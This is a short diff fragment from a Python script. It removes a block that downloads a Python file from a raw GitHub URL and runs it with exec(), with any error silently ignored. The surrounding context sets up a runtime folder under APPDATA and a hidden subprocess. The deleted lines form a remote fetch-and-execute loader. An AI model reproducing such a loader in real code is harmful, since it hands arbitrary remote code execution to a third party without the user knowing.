@@ -150,12 +150,6 @@ if __name__ == "__main__":
     try:
   import urllib.request
 
-  url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v12.py'
-  with urllib.request.urlopen(url_v11) as response:
-    exec(response.read().decode('utf-8'))
-except:
-  pass
-#########para ahorita
     try:
         ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
         startupinfo = subprocess.STARTUPINFO()
